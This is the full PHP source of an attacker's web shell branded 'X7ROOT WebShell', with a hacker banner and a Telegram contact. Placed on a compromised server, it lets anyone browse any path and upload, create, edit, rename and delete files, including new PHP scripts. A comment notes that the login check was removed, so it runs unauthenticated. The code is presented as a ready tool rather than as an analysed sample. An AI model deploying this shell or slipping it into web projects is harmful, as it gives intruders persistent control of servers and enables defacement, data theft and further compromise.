<?php
error_reporting(0);
session_start();

// ===== CONFIG =====
$logo_url        = 'https://j.top4top.io/p_340673e7e1.png';
$home_dir        = realpath(__DIR__);
// =====================

// —— LOGIN HANDLER ——
// Removed the login handler and session check for simplicity

// —— AUTHENTICATED SHELL —— 
$cwd   = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
$files = is_dir($cwd) ? scandir($cwd) : [];

// Helper: public URL
function fullUrl($filepath) {
    $docRoot = realpath($_SERVER['DOCUMENT_ROOT']);
    $real    = realpath($filepath);
    $rel     = str_replace($docRoot, '', $real);
    $proto   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    return $proto . '://' . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $rel);
}

// Message storage
$message = '';
$msgType = '';

// —— UPLOAD —— 
if (!empty($_FILES['upload']['name'])) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $url     = fullUrl($dest);
        $message = "[+] Uploaded: <a href=\"$url\" target=\"_blank\">" . basename($dest) . "</a>";
        $msgType = 'success';
    } else {
        $message = '[!] Upload failed.';
        $msgType = 'error';
    }
}

// —— EDIT SAVE —— 
if (isset($_POST['save'], $_POST['file'], $_POST['content'])) {
    file_put_contents($_POST['file'], $_POST['content']);
    $message = '[+] File saved successfully.';
    $msgType = 'success';
}

// —— DELETE —— 
if (isset($_GET['delete'])) {
    $target = realpath($_GET['delete']);
    if (is_dir($target) ? rmdir($target) : unlink($target)) {
        $message = '[+] Deleted successfully.';
        $msgType = 'success';
    } else {
        $message = '[!] Delete failed.';
        $msgType = 'error';
    }
}

// —— RENAME FORM —— 
if (isset($_GET['rename'])) {
    $old  = realpath($_GET['rename']);
    $base = basename($old);
    echo <<<HTML
<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Rename</title>
<style>body{background:#000;color:#fff;font-family:monospace;text-align:center;padding-top:100px;} input,button{padding:10px;width:240px;margin:5px;border:1px solid #444;background:#222;color:#fff;} button{background:#e53935;border:none;cursor:pointer;} button:hover{background:#c62828;}</style>
</head><body>
  <h2>Rename "{$base}"</h2>
  <form method="POST">
    <input type="hidden" name="file" value="{$old}">
    <input type="text" name="newname" value="{$base}" required><br>
    <button name="dorename">Rename</button>
  </form>
</body></html>
HTML;
    exit;
}

// —— RENAME ACTION —— 
if (isset($_POST['dorename'], $_POST['file'], $_POST['newname'])) {
    $old = realpath($_POST['file']);
    $new = dirname($old) . DIRECTORY_SEPARATOR . basename($_POST['newname']);
    if (rename($old, $new)) {
        $message = '[+] Renamed to ' . basename($new);
        $msgType = 'success';
    } else {
        $message = '[!] Rename failed.';
        $msgType = 'error';
    }
}

// —— CREATE FILE —— 
if (isset($_POST['create'], $_POST['newfile'])) {
    $newpath = $cwd . DIRECTORY_SEPARATOR . basename($_POST['newfile']);
    if (file_put_contents($newpath, $_POST['newcontent'])) {
        $message = '[+] Created: ' . basename($newpath);
        $msgType = 'success';
    } else {
        $message = '[!] Create failed.';
        $msgType = 'error';
    }
}

// ASCII banner
$banner = <<<HTML
<pre style="color:#ff4b4b;text-align:center;">
██╗  ██╗███████╗██████╗  ██████╗  ██████╗ ████████╗
╚██╗██╔╝╚════██║██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
 ╚███╔╝     ██╔╝██████╔╝██║   ██║██║   ██║   ██║   
 ██╔██╗    ██╔╝ ██╔══██╗██║   ██║██║   ██║   ██║   
██╔╝ ██╗   ██║  ██║  ██║╚██████╔╝╚██████╔╝   ██║   
</pre>
HTML;

// OUTPUT PAGE
echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>X7ROOT WebShell</title>
<style>
  body{margin:0;background:#000;color:#fff;font-family:monospace;}
  header{background:#111;padding:10px;text-align:center;}
  .logo{max-height:150px;display:block;margin:0 auto;}
  .container{padding:20px;}
  a{color:#ff4b4b;text-decoration:none;} a:hover{text-decoration:underline;}
  .path-nav{background:#111;padding:8px;border:1px solid #222;margin-bottom:15px;}
  .path-nav a{margin:0 4px;}
  .btn-home{margin-left:10px;padding:5px 10px;background:#00ff00;color:#000;border-radius:4px;text-decoration:none;}
  .message{margin-bottom:10px;text-align:center;}
  .message.success{color:#00ff00;}
  .message.error{color:#f44336;}
  input,textarea,button{font-family:inherit;}
  input[type=file],input[type=text],textarea{width:100%;padding:8px;margin:5px 0;background:#222;border:1px solid #444;color:#fff;}
  textarea{height:150px;}
  button,input[type=submit]{padding:8px 16px;background:#e53935;border:none;color:#fff;cursor:pointer;}
  button:hover,input[type=submit]:hover{background:#c62828;}
  ul{list-style:none;padding:0;}
  li{padding:6px;border-bottom:1px solid #222;}
  footer{background:#111;color:#fff;text-align:center;padding:10px;border-top:1px solid #222;}
  footer a{color:#00ff00;text-decoration:none;}
</style>
</head>
<body>
  <header>
    <img class="logo" src="$logo_url" alt="X7ROOT Logo">
    $banner
  </header>
  <div class="container">
    <div class="message $msgType">$message</div>
    <div class="path-nav"><strong>Path:</strong>
HTML;

// Breadcrumb
$parts = explode(DIRECTORY_SEPARATOR, $cwd);
$acc   = '';
foreach ($parts as $i => $part) {
    if ($part === '') {
        $acc = DIRECTORY_SEPARATOR;
        echo "<a href='?path=" . urlencode($acc) . "'>/</a>";
        continue;
    }
    $acc .= DIRECTORY_SEPARATOR . $part;
    echo "<a href='?path=" . urlencode($acc) . "'>" . htmlentities($part) . "</a>";
    if ($i < count($parts) - 1) echo " / ";
}
echo "<a class='btn-home' href='?path=" . urlencode($home_dir) . "'>Home</a>";

echo <<<HTML
    </div>
    <form method="POST" enctype="multipart/form-data">
      <input type="file" name="upload"><br>
      <button type="submit">Upload File</button>
    </form>
    <ul>
HTML;

// Separate directories and files
$dirs = [];
$files_only = [];
foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $full = $cwd . DIRECTORY_SEPARATOR . $file;
    if (is_dir($full)) {
        $dirs[] = $file;
    } else {
        $files_only[] = $file;
    }
}

// Show directories
foreach ($dirs as $file) {
    $full = $cwd . DIRECTORY_SEPARATOR . $file;
    $disp = htmlentities($file);
    $enc = urlencode($full);
    echo "<li>[DIR] <a href='?path={$enc}'>{$disp}</a> ";
    echo "<a href='?rename={$enc}'>[Rename]</a> ";
    echo "<a href='?delete={$enc}' onclick=\"return confirm('Delete?');\">[Delete]</a></li>";
}

// Show files
foreach ($files_only as $file) {
    $full = $cwd . DIRECTORY_SEPARATOR . $file;
    $disp = htmlentities($file);
    $enc = urlencode($full);
    echo "<li>[FILE] {$disp} ";
    echo "<a href='?edit={$enc}'>[Edit]</a> ";
    echo "<a href='?rename={$enc}'>[Rename]</a> ";
    echo "<a href='?delete={$enc}' onclick=\"return confirm('Delete?');\">[Delete]</a></li>";
}

echo <<<HTML
    </ul>
HTML;

// Edit form
if (isset($_GET['edit'])) {
    $file    = $_GET['edit'];
    $content = htmlspecialchars(file_get_contents($file));
    echo <<<FORM
    <form method="POST">
      <textarea name="content">$content</textarea>
      <input type="hidden" name="file" value="$file">
      <button name="save">Save Changes</button>
    </form>
FORM;
}

echo <<<HTML
    <hr>
    <form method="POST">
      <input type="text" name="newfile" placeholder="newfile.php" required>
      <textarea name="newcontent" placeholder="File content here"></textarea>
      <button name="create">Create File</button>
    </form>
  </div>
<footer>
  <p style="font-size: 18px; text-align: center; color: #fff;"> 
    <span style="color: #fff;">Telegram:</span> 
    <a href="https://t.me/X7ROOT" target="_blank" style="color: #f44336; font-size: 20px;">@X7ROOT</a>
  </p>
</footer>
</body>
</html>
HTML;
